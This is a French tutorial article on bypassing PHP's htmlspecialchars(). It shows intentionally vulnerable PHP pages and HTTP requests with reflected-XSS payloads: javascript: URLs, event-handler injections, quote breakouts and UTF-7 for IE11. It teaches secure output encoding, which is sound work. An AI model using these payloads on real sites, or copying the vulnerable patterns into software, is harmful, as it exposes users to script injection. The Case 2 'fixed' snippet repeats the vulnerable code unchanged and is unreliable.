---
description: 29 Juillet 2022
---

# Est-il possible de contourner la fonction PHP htmlspecialchars() ?

## La fonction htmlspecialchars()

Avant d'analyser la méthode `htmlspecialchars()`, voici le code d'une injection simple au sein d'une page HTML : &#x20;

```php
<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Une injection simple</title>
  </head>
  <body>
     <p><?php echo 'Une injection simple : ' . $_GET['param']; ?></p>
  </body>
</html>
```

La requête HTTP exploitant la vulnérabilité est la suivante :&#x20;

```http
GET /minipoc/htmlspecialchars/?param=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
```

Et voici la réponse HTTP associée :&#x20;

```html
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Debian)
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Une injection simple</title>
  </head>
  <body>
     <p>Une injection simple : <script>alert(1)</script></p>
  </body>
</html>
```

Le navigateur exécute le code Javascript renseigné dans le paramètre `param` présent dans l'URL (il s'agit donc d'une XSS réfléchie) :

![](<../../../.gitbook/assets/image (1).png>)

Si le développeur souhaite protéger son application (et ses visiteurs) de cette vulnérabilité, il se doit d'assainir la donnée non fiable (la valeur du paramètre `param`) avant son affichage. C'est ce que propose de faire la fonction `htmlspecialchars()`.

`htmlspecialchars()` est une [fonction PHP](https://www.php.net/manual/fr/function.htmlspecialchars.php) permettant de se protéger contre les injections de type Cross-Site Scripting (XSS) en convertissant certains caractères spéciaux en entités HTML :&#x20;

![](<../../../.gitbook/assets/image (18).png>)

La signature de la fonction est la suivante :&#x20;

```php
htmlspecialchars(
    string $string,
    int $flags = ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401,
    ?string $encoding = null,
    bool $double_encode = true
): string
```

Le premier paramètre est la chaîne à convertir. Le second un masque de plusieurs drapeaux (dont la valeur par défaut est `ENT_COMPAT`, ou `ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401` à partir de la version >= 8.1.0 de PHP) qui peut prendre une ou plusieurs des valeurs suivantes :&#x20;

![](<../../../.gitbook/assets/image (24).png>)

{% hint style="info" %}
Sauf quand indiqué, la version de PHP utilisée est ici la 7.4.30.
{% endhint %}

Le troisième, facultatif, est le jeu de caractères qui sera utilisé lors de la conversion. Par défaut, les versions récentes utilisent l'encodage "UTF-8" (modifiable dans le fichier de configuration php.ini). Les jeux de caractères supportés sont les suivants :&#x20;

![](<../../../.gitbook/assets/image (6).png>)

Le dernier paramètre est un booléen dont la valeur par défaut est `true`, qui spécifie si une entité HTML présente en entrée doit à nouveau être convertie (par exemple `&lt;`, soit le caractère `<`, donnera `&amp;lt;`) ou laissée telle quelle.



En général, il est relativement facile d'identifier une telle transformation. Voici l'exemple d'injection simple vu précédemment, mais cette fois, avec un assainissement effectué grâce à `htmlspecialchars()` :&#x20;

```php
<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Une injection simple protégée par htmlspecialchars()</title>
  </head>
  <body>
     <p><?php echo 'Une injection simple : ' . htmlspecialchars($_GET['param']); ?></p>
  </body>
</html>
```

La requête HTTP reste inchangée :&#x20;

```http
GET /minipoc/htmlspecialchars/?param=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
```

Mais dans la réponse HTTP, les entités HTML sont visibles (également visible dans le code source via un clic-droit -> "Afficher le code source de la page") :&#x20;

```html
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Debian)
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Une injection simple protégée par htmlspecialchars()</title>
  </head>
  <body>
     <p>Une injection simple : &lt;script&gt;alert(1)&lt;/script&gt;</p>
  </body>
</html>
```

L'injection ne semble plus possible, et la valeur du paramètre `param` est affichée correctement :&#x20;

&#x20;

![](<../../../.gitbook/assets/image (19).png>)

{% hint style="info" %}
L'article ne traite pas le cas de la [fonction](https://www.php.net/manual/fr/function.htmlentities.php) `htmlentities()` de PHP mais peut également s'y appliquer.
{% endhint %}

## Limites et contournements

### Les attributs HTML "src" et "href"

Lorsque la donnée non fiable est utilisée en tant que valeur des attributs HTML "src" ou "href", son assainissement par la fonction `htmlspecialchars()` ne fonctionnera pas :&#x20;

```php
<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Attribut "href" d'un lien</title>
  </head>
  <body>
     <p><?php echo '<a href="' . htmlspecialchars($_GET["param"]) . '">Lien</a>'; ?></p>
  </body>
</html>
```

L'affichage de la modale (ou l'exécution d'un code Javascript relativement simple) n'utilise pas les caractères transformés par la fonction PHP :&#x20;

```http
GET /minipoc/htmlspecialchars/?param=javascript:alert(1) HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
```

```html
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Debian)
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Une injection simple</title>
  </head>
  <body>
     <p><a href="javascript:alert(1)">Lien</a></p>
  </body>
</html>
```

Le code Javascript est exécuté lorsque la victime clique sur le lien :&#x20;

![](../../../.gitbook/assets/image.png)

De plus, selon le contexte d'interprétation des caractères ainsi transformés, cela peut n'avoir aucune incidence :&#x20;

```http
GET /minipoc/htmlspecialchars/?param=javascript:document.write(%22%3Cimg%20src=x%20onerror=alert(1)%3E%22) HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
```

```html
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Debian)
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Attribut "href" d'un lien</title>
  </head>
  <body>
     <p><a href="javascript:document.write(&quot;&lt;img src=x onerror=alert(1)&gt;&quot;)">Lien</a></p>
  </body>
</html>
```

Etant donné que l'interpréteur est ici le moteur Javascript et non le moteur de rendu HTML, les entités HTML sont tout de même interprétées.

```http
GET /minipoc/htmlspecialchars/x HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://192.168.56.101/minipoc/htmlspecialchars/?param=javascript:document.write(%22%3Cimg%20src=x%20onerror=alert(1)%3E%22)
Connection: close
```

&#x20;Soit lors du clic de la victime :&#x20;

![](<../../../.gitbook/assets/image (9).png>)

{% hint style="info" %}
Cet exemple est aussi valable pour l'attribut HTML "src" avec, par exemple, la balise `<iframe></iframe>`.
{% endhint %}

### Les évènements HTML

Les évènements HTML ne peuvent être assainis correctement par la méthode `htmlspecialchars()` car l'exécution s'effectue dans un contexte Javascript. Ici un exemple avec l'évènement `onlick` :

```php
<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Evènement HTML</title>
  </head>
  <body>
     <p><?php  echo '<div onclick=' . htmlspecialchars($_GET['param']) . '>Lorem ipsum dolor sit amet, ...</div>'; ?></p>
  </body>
</html>
```

```http
GET /minipoc/htmlspecialchars/?param=alert(1) HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
```

```html
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Debian)
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Evènement HTML</title>
  </head>
  <body>
     <p><div onclick=alert(1)>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</div></p>
  </body>
</html>
```

Soit lors du clic de l'utilisateur sur le paragraphe :&#x20;

![](<../../../.gitbook/assets/image (2).png>)

### Les attributs "safe" HTML

Les attributs "safe" sont des attributs HTML n'exécutant pas de code JavaScript, contrairement au évènements HTML. Voici la [liste](https://cheatsheetseries.owasp.org/cheatsheets/Cross\_Site\_Scripting\_Prevention\_Cheat\_Sheet.html#safe-sinks) de ces attributs :&#x20;

`align`, `alink`, `alt`, `bgcolor`, `border`, `cellpadding`, `cellspacing`, `class`, `color`, `cols`, `colspan`, `coords`, `dir`, `face`, `height`, `hspace`, `ismap`, `lang`, `marginheight`, `marginwidth`, `multiple`, `nohref`, `noresize`, `noshade`, `nowrap`, `ref`, `rel`, `rev`, `rows`, `rowspan`, `scrolling`, `shape`, `span`, `summary`, `tabindex`, `title`, `usemap`, `valign`, `value`, `vlink`, `vspace`, `width`

Attention, cela ne signifie pas que l'utilisation d'une entrée non fiable au sein d'un de ces attributs soit sécurisée :&#x20;

```php
<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Attribut "safe" HTML - "value"</title>
  </head>
  <body>
     <p><?php  echo '<input type="text" name="safeHTML" value="' . $_GET["param"] . '">'; ?></p>
  </body>
</html>
```

```http
GET /minipoc/htmlspecialchars/?param=whatever%22%20onmouseover=%22alert(1) HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
```

```html
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Debian)
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Attribut "safe" HTML - "value"</title>
  </head>
  <body>
     <p><input type="text" name="safeHTML" value="whatever" onmouseover="alert(1)"></p>
  </body>
</html>
```

Soit, au survol de la souris du champ `<input>` :

![](<../../../.gitbook/assets/image (5).png>)

L'appel à la fonction `htmlspecialchars()` est-elle suffisante pour protéger l'application dans ce cas ?&#x20;

#### Cas n°1

Le premier cas est celui précédemment exposé mais dont la donnée non fiable a été assainie avec la fonction PHP :&#x20;

```php
<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Attribut "safe" HTML - "value"</title>
  </head>
  <body>
     <p><?php  echo '<input type="text" name="safeHTML" value="' . htmlspecialchars($_GET["param"]) . '">'; ?></p>
  </body>
</html>
```

```http
GET /minipoc/htmlspecialchars/?param=whatever%22%20onmouseover=%22alert(1) HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
```

La fonction `htmlspecialchars()` a transformé les caractères spéciaux en entités HTML :

```html
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Debian)
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Attribut "safe" HTML - "value"</title>
  </head>
  <body>
     <p><input type="text" name="safeHTML" value="whatever&quot; onmouseover=&quot;alert(1)"></p>
  </body>
</html>
```

Protégeant ainsi l'application :&#x20;

![](<../../../.gitbook/assets/image (10).png>)

#### Cas n°2

Cet exemple est sensiblement le même, mais l'ordre d'utilisation des caractères `"` et `'` au sein du code PHP a été ici modifié :&#x20;

```php
<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Attribut "safe" HTML - "value"</title>
  </head>
  <body>
     <p><?php  echo "<input type='text' name='safeHTML' value='" . htmlspecialchars($_GET["param"]) . "'>"; ?></p>
  </body>
</html>
```

```http
GET /minipoc/htmlspecialchars/?param=whatever%27%20onmouseover=%27alert(1) HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
```

```html
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Debian)
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Attribut "safe" HTML - "value"</title>
  </head>
  <body>
     <p><input type='text' name='safeHTML' value='whatever' onmouseover='alert(1)'></p>
  </body>
</html>
```

Cette fois, l'application reste vulnérable :&#x20;

![](<../../../.gitbook/assets/image (16).png>)

Cela provient du fait que le développeur n'a pas renseigné tous les paramètres nécessaires à la fonction. La fonction, par défaut, ne transforme pas le caractère `'` si le drapeau `ENT_QUOTES` n'est pas renseigné :&#x20;

```php
<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Attribut "safe" HTML - "value"</title>
  </head>
  <body>
     <p><?php  echo "<input type='text' name='safeHTML' value='" . htmlspecialchars($_GET["param"]) . "'>"; ?></p>
  </body>
</html>
```

Grâce à cette modification, l'application semble être maintenant protégée :&#x20;

![](<../../../.gitbook/assets/image (14).png>)

#### Cas n°3

Cette fois, le développeur attribue bien la bonne valeur de drapeau a la fonction d'assainissement, mais n'entoure pas les valeurs des attributs HTML avec les caractères `"` ou `'` :&#x20;

```php
<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Attribut "safe" HTML - "value"</title>
  </head>
  <body>
     <p><?php  echo '<input type=text name=safeHTML value=' . htmlspecialchars($_GET["param"], ENT_QUOTES) . '>'; ?></p>
  </body>
</html>
```

```http
GET /minipoc/htmlspecialchars/?param=whatever%20onmouseover=alert(1) HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
```

```html
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Debian)
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>Attribut "safe" HTML - "value"</title>
  </head>
  <body>
     <p><input type=text name=safeHTML value=whatever onmouseover=alert(1)></p>
  </body>
</html>
```

L'injection est ici tout de même réussie :&#x20;

![](<../../../.gitbook/assets/image (7).png>)

#### PHP 8.1.0

La version 8.1.0 introduit une modification dans la valeur par défaut des drapeaux de la fonction `htmlspecialchars()` :&#x20;

![](<../../../.gitbook/assets/image (17).png>)

Ce changement a pour effet de ne plus rendre vulnérable le **cas n°2** dans le cas de l'omission du second paramètre.

### Le jeu de caractères (encoding)

> Je n'ai ici trouvé que très peu de ressources sur d'éventuelles vulnérabilités quant au jeu de caractères présent en troisième paramètre de la fonction, voici un début de trouvaille sur IE11.

Le troisième paramètre est le jeu de caractères utilisé lors de la conversion. Par défaut, il prend la valeur définit dans le fichier php.ini, soit généralement "UTF-8" pour les versions de PHP assez récentes.

Le code suivant permet une injection XSS malgré l'utilisation de la fonction `htmlspecialchars()`, mais cela ne semble fonctionner que sous IE 11 :&#x20;

```php
<<!DOCTYPE html>
<html lang="fr">
  <head>
    <title>XSS in IE11</title>
  </head>
  <body>
    <p>
      <?php 
        header('Content-Type: text/html;charset=UTF-7');
        echo "xss encoding : " . htmlspecialchars($_SERVER["QUERY_STRING"], ENT_QUOTES, "UTF-8");
      ?>
    </p>       
  </body>
</html>
```

Deux limitations à cette exploitation :&#x20;

* Elle ne semble pas fonctionner lorsque la valeur du paramètre est récupérée depuis `$_GET['param']`
* L'attaquant doit trouver un moyen de forcer l'encodage de la page à "UTF-7" (codé en dur dans l'exemple : `header('Content-Type: text/html;charset=UTF-7');` )

Pour exploiter la vulnérabilité, l'attaque transforme tout d'abord son injection en "UTF-7". Ici `<script>alert(1)</script>` donne `+ADw-script+AD4-alert(1)+ADw-/script+AD4-` : &#x20;

![](<../../../.gitbook/assets/image (20).png>)

Cette exploitation possède par contre l'avantage de contourner le filtre anti-XSS d'IE 11 :&#x20;

```http
GET /minipoc/htmlspecialchars/indexie.php?xss=+ADw-script+AD4-alert(1)+ADw-/script+AD4- HTTP/1.1
Accept: text/html, application/xhtml+xml, image/jxr, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko
Host: 192.168.56.101
Connection: close
```

```html
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Debian)
Connection: close
Content-Type: text/html;charset=UTF-7

<html>
  <head>
    <title>XSS in IE11e</title>
  </head>
  <body>
    <p>
      xss encoding : xss=+ADw-script+AD4-alert(1)+ADw-/script+AD4-
    </p>
  </body>
</html>
```

![](<../../../.gitbook/assets/image (4).png>)

## Conclusion

L'utilisation de la fonction `htmlspecialchars()` n'est donc pas si simple que cela, et nécessite de bien réfléchir à son contexte d'utilisation. PHP 8.1.0 améliore les choses en modifiant les drapeaux par défaut et en évitant ainsi une possibilité d'injection. Le mieux, reste sans doute de bien renseigner les les trois paramètres possibles, par exemple :&#x20;

```php
htmlspecialchars($_GET["untrustedInput"], ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML5, "UTF-8");
```

Il y a également d'autres emplacements non couverts dans cet article mais qui nécessite une attention particulière (comprendre par là que `htmlspecialchars()` ne sera sans doute pas suffisant comme protection). Par exemple au sein de code Javascript ou encore de code CSS.
